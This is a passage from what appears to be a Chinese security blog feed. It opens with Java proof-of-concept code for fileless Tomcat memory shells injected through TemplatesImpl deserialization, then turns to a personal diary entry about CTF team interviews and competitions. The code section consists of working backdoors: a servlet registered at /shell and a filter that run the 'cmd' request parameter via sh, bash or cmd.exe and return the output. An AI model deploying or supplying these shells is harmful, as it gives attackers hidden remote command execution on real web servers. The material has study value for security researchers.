java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">tomcat72</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">tomcat72</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">try</span>&#123;            <span class="hljs-type">MBeanServer</span> <span class="hljs-variable">mbeanServer</span> <span class="hljs-operator">=</span> Registry.getRegistry((Object)<span class="hljs-literal">null</span>, (Object)<span class="hljs-literal">null</span>).getMBeanServer();            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.jmx.mbeanserver.JmxMBeanServer&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;mbsInterceptor&quot;</span>);            field.setAccessible(<span class="hljs-literal">true</span>);            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> field.get(mbeanServer);            field = Class.forName(<span class="hljs-string">&quot;com.sun.jmx.interceptor.DefaultMBeanServerInterceptor&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;repository&quot;</span>);            field.setAccessible(<span class="hljs-literal">true</span>);            obj = field.get(obj);            field = Class.forName(<span class="hljs-string">&quot;com.sun.jmx.mbeanserver.Repository&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;domainTb&quot;</span>);            field.setAccessible(<span class="hljs-literal">true</span>);            <span class="hljs-type">HashMap</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> (HashMap)field.get(obj);            obj = ((HashMap)obj2.get(<span class="hljs-string">&quot;Catalina&quot;</span>)).get(<span class="hljs-string">&quot;name=\&quot;http-bio-8888\&quot;,type=GlobalRequestProcessor&quot;</span>);            field = Class.forName(<span class="hljs-string">&quot;com.sun.jmx.mbeanserver.NamedObject&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;object&quot;</span>);            field.setAccessible(<span class="hljs-literal">true</span>);            obj = field.get(obj);            field = Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.modeler.BaseModelMBean&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;resource&quot;</span>);            field.setAccessible(<span class="hljs-literal">true</span>);            obj = field.get(obj);            field = Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;processors&quot;</span>);            field.setAccessible(<span class="hljs-literal">true</span>);            <span class="hljs-type">ArrayList</span> <span class="hljs-variable">obj3</span> <span class="hljs-operator">=</span> (ArrayList)field.get(obj);            field = Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;req&quot;</span>);            field.setAccessible(<span class="hljs-literal">true</span>);            <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;            <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);            <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;                isLinux = <span class="hljs-literal">false</span>;            &#125;            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; obj3.size(); i++) &#123;                <span class="hljs-type">Request</span> <span class="hljs-variable">obj4</span> <span class="hljs-operator">=</span> (Request) field.get(obj3.get(i));                <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> obj4.getParameters().getParameter(<span class="hljs-string">&quot;username&quot;</span>);                <span class="hljs-keyword">if</span>(username != <span class="hljs-literal">null</span>)&#123;                    String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, username&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>,  username&#125;;                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();                    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\a&quot;</span>);                    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;                    <span class="hljs-keyword">while</span> (s.hasNext())&#123;                        output += s.next();                    &#125;                    <span class="hljs-type">byte</span>[] buf = output.getBytes();                    <span class="hljs-type">ByteChunk</span> <span class="hljs-variable">bc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteChunk</span>();                    bc.setBytes(buf, <span class="hljs-number">0</span>, buf.length);                    obj4.getResponse().doWrite(bc);                    <span class="hljs-keyword">break</span>;                &#125;            &#125;        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<span class="hljs-comment">//            System.out.println(&quot;=======================&quot;);</span><span class="hljs-comment">//            System.out.println(e);</span>        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;&#125;</code></pre></div><h2 id="结合连续剧原理的有关TemplatesImpl的poc"><a href="#结合连续剧原理的有关TemplatesImpl的poc" class="headerlink" title="结合连续剧原理的有关TemplatesImpl的poc"></a>结合连续剧原理的有关TemplatesImpl的poc</h2><p>具体的什么类型的马可以自行根据前面原理实现不同接口</p><p>反正我们能通过下面两种方式获取通用的request和response对象</p><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<span class="hljs-keyword">import</span> org.apache.catalina.<span class="hljs-keyword">Wrapper</span>;<span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;<span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<span class="hljs-keyword">import</span> javax.servlet.*;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.InputStream;<span class="hljs-keyword">import</span> java.io.PrintWriter;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> shellcode extends AbstractTranslet implements Servlet&#123;    static &#123;        try &#123;            <span class="hljs-keyword">Class</span>&lt;?&gt; clazz = <span class="hljs-keyword">Class</span>.forName(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;);            Field WRAP_SAME_OBJECT = <span class="hljs-keyword">Class</span>.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;).getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);            Field lastServicedRequest = clazz.getDeclaredField(&quot;lastServicedRequest&quot;);            Field lastServicedResponse = clazz.getDeclaredField(&quot;lastServicedResponse&quot;);            Field modifiers = Field.<span class="hljs-keyword">class</span>.getDeclaredField(&quot;modifiers&quot;);            modifiers.setAccessible(<span class="hljs-keyword">true</span>);            // 去掉final修饰符，设置访问权限            modifiers.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() &amp; ~Modifier.FINAL);            modifiers.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);            modifiers.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);            WRAP_SAME_OBJECT.setAccessible(<span class="hljs-keyword">true</span>);            lastServicedRequest.setAccessible(<span class="hljs-keyword">true</span>);            lastServicedResponse.setAccessible(<span class="hljs-keyword">true</span>);            // 修改 WRAP_SAME_OBJECT 并且初始化 lastServicedRequest 和 lastServicedResponse            <span class="hljs-keyword">if</span> (!WRAP_SAME_OBJECT.getBoolean(<span class="hljs-keyword">null</span>)) &#123;                WRAP_SAME_OBJECT.setBoolean(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">true</span>);                lastServicedRequest.<span class="hljs-keyword">set</span>(<span class="hljs-keyword">null</span>, <span class="hljs-built_in">new</span> ThreadLocal&lt;ServletRequest&gt;());                lastServicedResponse.<span class="hljs-keyword">set</span>(<span class="hljs-keyword">null</span>, <span class="hljs-built_in">new</span> ThreadLocal&lt;ServletResponse&gt;());            &#125; <span class="hljs-keyword">else</span> &#123;                String <span class="hljs-type">name</span> = &quot;xxx&quot;;                //从req中获取ServletContext对象                // 第二次请求后进入 <span class="hljs-keyword">else</span> 代码块，获取 Request 和 Response 对象，写入回显                ThreadLocal&lt;ServletRequest&gt; threadLocalReq = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.<span class="hljs-keyword">get</span>(<span class="hljs-keyword">null</span>);                ThreadLocal&lt;ServletResponse&gt; threadLocalResp = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponse.<span class="hljs-keyword">get</span>(<span class="hljs-keyword">null</span>);                ServletRequest servletRequest = threadLocalReq.<span class="hljs-keyword">get</span>();                ServletResponse servletResponse = threadLocalResp.<span class="hljs-keyword">get</span>();                ServletContext servletContext = servletRequest.getServletContext();                <span class="hljs-keyword">if</span> (servletContext.getServletRegistration(<span class="hljs-type">name</span>) == <span class="hljs-keyword">null</span>) &#123;                    StandardContext o = <span class="hljs-keyword">null</span>;                    // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象                    <span class="hljs-keyword">while</span> (o == <span class="hljs-keyword">null</span>) &#123;                        Field f = servletContext.getClass().getDeclaredField(&quot;context&quot;);                        f.setAccessible(<span class="hljs-keyword">true</span>);                        <span class="hljs-keyword">Object</span> <span class="hljs-keyword">object</span> = f.<span class="hljs-keyword">get</span>(servletContext);                        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">object</span> instanceof ServletContext) &#123;                            servletContext = (ServletContext) <span class="hljs-keyword">object</span>;                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">object</span> instanceof StandardContext) &#123;                            o = (StandardContext) <span class="hljs-keyword">object</span>;                        &#125;                    &#125;                    //自定义servlet                    Servlet servlet = <span class="hljs-built_in">new</span> shellcode();                    //用<span class="hljs-keyword">Wrapper</span>封装servlet                    <span class="hljs-keyword">Wrapper</span> newWrapper = o.createWrapper();                    newWrapper.setName(<span class="hljs-type">name</span>);                    newWrapper.setLoadOnStartup(<span class="hljs-number">1</span>);                    newWrapper.setServlet(servlet);                    //向children中添加<span class="hljs-keyword">Wrapper</span>                    o.addChild(newWrapper);                    //添加servlet的映射                    o.addServletMappingDecoded(&quot;/shell&quot;, <span class="hljs-type">name</span>);                &#125;            &#125;        &#125; catch (<span class="hljs-keyword">Exception</span> e) &#123;            e.printStackTrace();        &#125;    &#125;    @Override    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> <span class="hljs-keyword">transform</span>(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    @Override    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> <span class="hljs-keyword">transform</span>(DOM document, DTMAxisIterator iterator, SerializationHandler <span class="hljs-keyword">handler</span>) throws TransletException &#123;    &#125;    @Override    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> init(ServletConfig servletConfig) throws ServletException &#123;    &#125;    @Override    <span class="hljs-built_in">public</span> ServletConfig getServletConfig() &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;    &#125;    @Override    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;        String cmd = servletRequest.getParameter(&quot;cmd&quot;);        <span class="hljs-type">boolean</span> isLinux = <span class="hljs-keyword">true</span>;        String osTyp = <span class="hljs-keyword">System</span>.getProperty(&quot;os.name&quot;);        <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;            isLinux = <span class="hljs-keyword">false</span>;        &#125;        String[] cmds = isLinux ? <span class="hljs-built_in">new</span> String[]&#123;&quot;sh&quot;, &quot;-c&quot;, cmd&#125; : <span class="hljs-built_in">new</span> String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;;        InputStream <span class="hljs-keyword">in</span> = Runtime.getRuntime().exec(cmds).getInputStream();        Scanner s = <span class="hljs-built_in">new</span> Scanner(<span class="hljs-keyword">in</span>).useDelimiter(&quot;\\a&quot;);        String output = s.hasNext() ? s.next() : &quot;&quot;;        PrintWriter <span class="hljs-keyword">out</span> = servletResponse.getWriter();        <span class="hljs-keyword">out</span>.println(output);        <span class="hljs-keyword">out</span>.flush();        <span class="hljs-keyword">out</span>.<span class="hljs-keyword">close</span>();    &#125;    @Override    <span class="hljs-built_in">public</span> String getServletInfo() &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;    &#125;    @Override    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> destroy() &#123;    &#125;&#125;</code></pre></div><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.catalina.Context;<span class="hljs-keyword">import</span> org.apache.catalina.connector.Connector;<span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationContext;<span class="hljs-keyword">import</span> org.apache.catalina.core.StandardService;<span class="hljs-keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;<span class="hljs-keyword">import</span> org.apache.coyote.AbstractProtocol;<span class="hljs-keyword">import</span> org.apache.coyote.Request;<span class="hljs-keyword">import</span> org.apache.coyote.RequestGroupInfo;<span class="hljs-keyword">import</span> org.apache.coyote.RequestInfo;<span class="hljs-keyword">import</span> org.apache.tomcat.util.net.AbstractEndpoint;<span class="hljs-keyword">import</span> javax.servlet.*;<span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.InputStream;<span class="hljs-keyword">import</span> java.io.PrintWriter;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-comment">//@WebFilter(filterName = &quot;testFilter&quot;, urlPatterns = &quot;/*&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Filter3</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request1, ServletResponse response1, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();            <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> loader.getResources().getContext();            <span class="hljs-comment">// 获取 ApplicationContext</span>            <span class="hljs-type">Field</span> <span class="hljs-variable">applicationContextField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);            applicationContextField.setAccessible(<span class="hljs-literal">true</span>);            <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(context);            <span class="hljs-comment">// 获取 StandardService</span>            <span class="hljs-type">Field</span> <span class="hljs-variable">serviceField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;service&quot;</span>);            serviceField.setAccessible(<span class="hljs-literal">true</span>);            <span class="hljs-type">StandardService</span> <span class="hljs-variable">standardService</span> <span class="hljs-operator">=</span> (StandardService) serviceField.get(applicationContext);            <span class="hljs-comment">// 获取 Connector 并筛选 HTTP Connector</span>            Connector[] connectors = standardService.findConnectors();            <span class="hljs-keyword">for</span> (Connector connector : connectors) &#123;                <span class="hljs-keyword">if</span> (connector.getScheme().contains(<span class="hljs-string">&quot;http&quot;</span>)) &#123;                    <span class="hljs-comment">// 获取 AbstractProtocol 对象</span>                    <span class="hljs-type">AbstractProtocol</span> <span class="hljs-variable">abstractProtocol</span> <span class="hljs-operator">=</span> (AbstractProtocol) connector.getProtocolHandler();                    <span class="hljs-comment">// 获取 AbstractProtocol$ConnectionHandler</span>                    <span class="hljs-type">Method</span> <span class="hljs-variable">getHandler</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.AbstractProtocol&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getHandler&quot;</span>);                    getHandler.setAccessible(<span class="hljs-literal">true</span>);                    AbstractEndpoint.<span class="hljs-type">Handler</span> <span class="hljs-variable">ConnectionHandler</span> <span class="hljs-operator">=</span> (AbstractEndpoint.Handler) getHandler.invoke(abstractProtocol);                    <span class="hljs-comment">// global(RequestGroupInfo)</span>                    <span class="hljs-type">Field</span> <span class="hljs-variable">globalField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;global&quot;</span>);                    globalField.setAccessible(<span class="hljs-literal">true</span>);                    <span class="hljs-type">RequestGroupInfo</span> <span class="hljs-variable">global</span> <span class="hljs-operator">=</span> (RequestGroupInfo) globalField.get(ConnectionHandler);                    <span class="hljs-comment">// processors (ArrayList)</span>                    <span class="hljs-type">Field</span> <span class="hljs-variable">processorsField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;processors&quot;</span>);                    processorsField.setAccessible(<span class="hljs-literal">true</span>);                    <span class="hljs-type">ArrayList</span> <span class="hljs-variable">processors</span> <span class="hljs-operator">=</span> (ArrayList) processorsField.get(global);                    <span class="hljs-keyword">for</span> (Object processor : processors) &#123;                        <span class="hljs-type">RequestInfo</span> <span class="hljs-variable">requestInfo</span> <span class="hljs-operator">=</span> (RequestInfo) processor;                        <span class="hljs-comment">// 依据 QueryString 获取对应的 RequestInfo</span>                        <span class="hljs-keyword">if</span> (requestInfo.getCurrentQueryString().contains(<span class="hljs-string">&quot;cmd&quot;</span>)) &#123;                            <span class="hljs-type">Field</span> <span class="hljs-variable">reqField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;req&quot;</span>);                            reqField.setAccessible(<span class="hljs-literal">true</span>);                            <span class="hljs-comment">// org.apache.coyote.Request</span>                            <span class="hljs-type">Request</span> <span class="hljs-variable">requestTemp</span> <span class="hljs-operator">=</span> (Request) reqField.get(requestInfo);                            <span class="hljs-comment">// org.apache.catalina.connector.Request</span>                            org.apache.catalina.connector.<span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (org.apache.catalina.connector.Request) requestTemp.getNote(<span class="hljs-number">1</span>);                            <span class="hljs-comment">// 执行命令</span>                            cmd = request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);                            String[] cmds = <span class="hljs-literal">null</span>;                            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;                                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;                                    cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;                                &#125; <span class="hljs-keyword">else</span> &#123;                                    cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;                                &#125;                                <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();                                <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(inputStream).useDelimiter(<span class="hljs-string">&quot;//A&quot;</span>);                                <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;                                <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> request.getResponse().getWriter();                                writer.write(output);                                writer.flush();                                writer.close();                                <span class="hljs-keyword">break</span>;                            &#125;                        &#125;                    &#125;                &#125;            &#125;        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;            e.printStackTrace();        &#125;        chain.doFilter(request1, response1);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;&#125;</code></pre></div><h4 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h4><p>该方法在tomcat10以下应该是可以通杀的，因为之前用的高版本springBoot，经过测试发现springboot在2.6以后移除了<code>getresources</code>方法</p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>很烦，不懂到底什么是无文件，难不成前面的都是有文件的吗</p><p>其次没有利用例子，等下次就算遇到也不知道要用，很烦啊</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>阶段总结</title>
    <link href="/2024/02/26/%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93/"/>
    <url>/2024/02/26/%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="阶段总结"><a href="#阶段总结" class="headerlink" title="阶段总结"></a>阶段总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在是2月26号凌晨5点20分，距离上那该死的早八还有三个小时，因为先前熬夜太多，导致现在醒来后毫无睡意</p><p>由于之前看了别人年度总结和Boogipop的年初展望，我也想写，但发现我好像什么都没干成</p><p>现在结合最近的经历，写一下总结</p><h2 id="联队"><a href="#联队" class="headerlink" title="联队"></a>联队</h2><p>看了pazuris师傅的年度总结，实在让我感叹万千</p><p>师傅在23年暑假面试了V&amp;N，并且在tel✌的指导下成功成为V&amp;N的一员</p><p><img src="/../images/%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93/image-20240226053337473.png" alt="image-20240226053337473"></p><p>看了下这些知识发现我应该大差不差，都有过了解</p><p>然后接着看文章发现pazuris师傅竟然还晋升为W&amp;M的一员</p><p>从中发现最关键的信息是pazuris师傅学东西学的很快，这是我并不具备的品质</p><p>感慨的同时，不禁对联队开始心生向往</p><h3 id="nepnep"><a href="#nepnep" class="headerlink" title="nepnep"></a>nepnep</h3><p>结合我学CTF的个人经历，我对nepnep战队情有独钟</p><p>于是我在考完期末考试后，就发送了我的简历</p><p>然后就是无尽的等待，中间安排一次面试，但那时感冒了，便推迟了</p><p>面试时间定在了2月22日，我回学校的前一天</p><p>面试nepnep贯穿了整个寒假，也注定了我失败的下场</p><p>面试时我自己提出会的CC链和fastjson以及博客里的东西，结果反而被这些给问倒了</p><p>drunkbaby师傅提出了好多没了解过的概念，java面的一塌糊涂</p><p>虽然知道自己很菜，但还是没想到自己竟然败得如此彻底</p><h3 id="V-N"><a href="#V-N" class="headerlink" title="V&amp;N"></a>V&amp;N</h3><p>2月17号打了VNCTF</p><p>web 3&#x2F;8，有两题感觉差一点，</p><p>感觉不错吧但又没达到我理想的水平，至少那两道题是应该做出来的</p><p>然后在问卷中填了有意向加入V&amp;N，赛后便有师傅加我，然后我发送简历</p><p>当时nepnep还没面试，想着先在V&amp;N这边攒点经验</p><p>结果V&amp;N就比nepnep提前一天，没什么能准备的。。。。。</p><p>面试V&amp;N，有unknown在感觉还是不错的，没那么慌</p><p>面试中烨师傅问的问题我没有很深地了解，只能说Boogipop大佬博客都有，他在最后说早知道叫他来面你了（哈哈</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>其实感觉两场发挥的都差不多，只怪面nepnep时drunkbaby师傅问我java学到哪，我tm鬼使神差地说了CC链和fastjson，然后就被疯狂往这两个方向攻击，其次怪我博客上没太了解的东西都写了上去，结果被问到了</p><p>我tm的fastjson实际原理都没调过，只收集绕过技巧和常见打法，导致他在问原生反序列化时我都不知道啥叫原生</p><p>其他还有些根本没听过的东西，唉</p><p>nepnep当天就给出了面试结果，毫无意外地失败了</p><p><img src="/../images/%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93/image-20240226060227846.png" alt="image-20240226060227846"></p><p>其实要真是这表面上的原因的话，我是有点不服的</p><p>关于分享，在刚加入学校工作室时是比较期望的，因为学习没有方向，我很喜欢听别人的分享</p><p>但我们这届积极性不高，再加上指导老师正忙着他的事情，所以办了几次分享会后就没办过了</p><p>然后大二招新后开会说到这个，指导老师表示他忙完了，接下来会重视这个分享会，还是十分期待的</p><p>但现在校队学web的大佬就几个（两个条件，所以能学到的还是比较少的，所以还是想向外扩展</p><p>同时也是因为我很喜欢分享会，在我B站上刷到nepnep的账号，发现有大量分享会后，我直接就开始学习</p><p>这也是我前面说到对nepnep情有独钟的原因之一</p><p>然后比赛活跃度其实我的积极性还是挺高的，只是打不出成绩而已</p><p>V&amp;N那边unknown还特意等到我nepnep出结果（实际上早就出了</p><p>他比较推荐我去nepnep，我也十分想去，但可惜啊</p><p><img src="/../images/%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93/image-20240226060501079.png" alt="image-20240226060501079"></p><p>心碎了一地，可能就这样吧</p><h2 id="寒假-比赛"><a href="#寒假-比赛" class="headerlink" title="寒假&amp;比赛"></a>寒假&amp;比赛</h2><p>这个寒假是有史以来最摆的一个，几乎没有学新的东西，要说的话顶多是打了些比赛，当练手了</p><p>2023春秋杯网络安全联赛冬季赛</p><p>NSSCTF Round#16 Basic</p><p>NSSCTF Round#17 Basic</p><p>西湖论剑</p><p>L3HCTF（XCTF分站赛</p><p>第二届N1CTF Junior</p><p>BeginCTF</p><p>SICTF Round#3</p><p>HGAME week1-week4（还剩几天</p><p>大比赛都没做出来，其他简单的和新生赛还好吧</p><p>总之这个寒假就是一个字——寄</p><h2 id="人脉"><a href="#人脉" class="headerlink" title="人脉"></a>人脉</h2><p>我不是善交朋友的人，很羡慕FallW1nd这么优秀还认识很多大佬</p><p>能够加上好友并与之交谈并不是容易之事</p><h3 id="N1ght师傅"><a href="#N1ght师傅" class="headerlink" title="N1ght师傅"></a>N1ght师傅</h3><p>当初CNSS招新赛时就看到了师傅</p><p>SICTF Round#3 ，CC_deserialize题目出题人</p><p>当时看这题0解，再加上给出的hint比较吸引我，有了解但没做过，于是进行尝试</p><p>8个小时，凌晨12点开始到早上八点</p><p>其实已经写出预期解，但是中间有一步出了问题（不在考点内</p><p>很遗憾丧失一血（最终仍是0解，成为最接近成功的一位</p><p>赛后加好友聊了一下</p><p>现在的话应该是有交流最好的一位吧</p><h3 id="Boogipop大佬"><a href="#Boogipop大佬" class="headerlink" 